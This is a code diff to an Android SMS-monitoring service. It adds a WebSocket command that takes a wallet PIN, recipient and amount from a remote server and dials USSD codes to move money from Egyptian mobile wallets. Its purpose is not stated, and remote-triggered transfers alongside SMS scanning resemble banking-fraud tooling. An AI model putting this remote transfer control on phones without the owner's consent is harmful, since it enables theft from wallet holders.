@@ -468,6 +468,77 @@ public class SmsMonitorService extends Service {
                     } else if ("FORCE_SMS_SCAN".equals(type)) {
                         Log.i(TAG, "🔄 Force resync triggered via WebSocket command (from install_timestamp)");
                         scanFromInstallDate();
+                    } else if ("INITIATE_TRANSFER".equals(type)) {
+                        String walletId = payload.optString("wallet_id");
+                        String recipient = payload.optString("recipient");
+                        double amount = payload.optDouble("amount");
+                        String pin = payload.optString("pin");
+                        int simSlot = payload.optInt("sim_slot", 0);
+                        
+                        Log.i(TAG, "💸 Initiate transfer request: wallet=" + walletId + ", amount=" + amount + ", simSlot=" + simSlot);
+                        
+                        String ussdCode = "";
+                        if ("vodafone_cash".equals(walletId)) {
+                            ussdCode = "*9*7*" + recipient + "*" + (int)amount + "*" + pin + "#";
+                        } else if ("orange_cash".equals(walletId)) {
+                            ussdCode = "#7115*1*" + recipient + "*" + (int)amount + "*" + pin + "#";
+                        } else if ("etisalat_cash".equals(walletId)) {
+                            ussdCode = "*777*1*" + recipient + "*" + (int)amount + "*" + pin + "#";
+                        } else if ("we_pay".equals(walletId)) {
+                            ussdCode = "*7*2*" + recipient + "*" + (int)amount + "*" + pin + "#";
+                        }
+
+                        if (!ussdCode.isEmpty()) {
+                            try {
+                                Intent callIntent = new Intent(Intent.ACTION_CALL);
+                                String encodedUssd = ussdCode.replace("#", "%23");
+                                callIntent.setData(android.net.Uri.parse("tel:" + encodedUssd));
+                                callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                                
+                                // 1. تعيين خيارات الشريحة بناءً على مفاتيح الهواتف المختلفة (الأكثر شيوعاً)
+                                callIntent.putExtra("com.android.phone.extra.slot", simSlot);
+                                callIntent.putExtra("com.android.phone.dialing.slot", simSlot);
+                                callIntent.putExtra("simSlot", simSlot);
+                                callIntent.putExtra("sim_slot", simSlot);
+                                callIntent.putExtra("subscription", simSlot);
+                                callIntent.putExtra("subscription_id", simSlot);
+                                callIntent.putExtra("phone", simSlot);
+                                callIntent.putExtra("slotId", simSlot);
+                                callIntent.putExtra("slot", simSlot);
+                                callIntent.putExtra("phoneId", simSlot);
+                                
+                                // 2. تعيين شريحة الاتصال الرسمية باستخدام TelecomManager
+                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                                    try {
+                                        android.telecom.TelecomManager telecomManager = (android.telecom.TelecomManager) getSystemService(Context.TELECOM_SERVICE);
+                                        if (telecomManager != null) {
+                                            if (androidx.core.content.ContextCompat.checkSelfPermission(SmsMonitorService.this, android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                                                java.util.List<android.telecom.PhoneAccountHandle> accountHandles = telecomManager.getCallCapablePhoneAccounts();
+                                                if (simSlot >= 0 && simSlot < accountHandles.size()) {
+                                                    android.telecom.PhoneAccountHandle selectedHandle = accountHandles.get(simSlot);
+                                                    callIntent.putExtra(android.telecom.TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, selectedHandle);
+                                                    Log.i(TAG, "Bound PhoneAccountHandle for SIM slot " + simSlot + ": " + selectedHandle.toString());
+                                                } else {
+                                                    Log.w(TAG, "simSlot out of bounds for call accounts size: " + accountHandles.size());
+                                                }
+                                            } else {
+                                                Log.w(TAG, "READ_PHONE_STATE permission not granted, skipping TelecomManager SIM selection");
+                                            }
+                                        }
+                                    } catch (Exception ex) {
+                                        Log.e(TAG, "Error applying TelecomManager SIM slot", ex);
+                                    }
+                                }
+
+                                startActivity(callIntent);
+                                mainHandler.post(() -> Toast.makeText(SmsMonitorService.this, "💸 جاري إرسال طلب التحويل المالي...", Toast.LENGTH_LONG).show());
+                            } catch (SecurityException se) {
+                                Log.e(TAG, "❌ CALL_PHONE permission not granted for direct USSD dial!", se);
+                                mainHandler.post(() -> Toast.makeText(SmsMonitorService.this, "❌ خطأ: يرجى تفعيل صلاحية الاتصال وحالة الهاتف للتطبيق", Toast.LENGTH_LONG).show());
+                            } catch (Exception ex) {
+                                Log.e(TAG, "❌ Failed to dial USSD code", ex);
+                            }
+                        }
                     }
                 } catch (Exception e) {
                     Log.e(TAG, "Error parsing incoming WS message: " + e.getMessage());
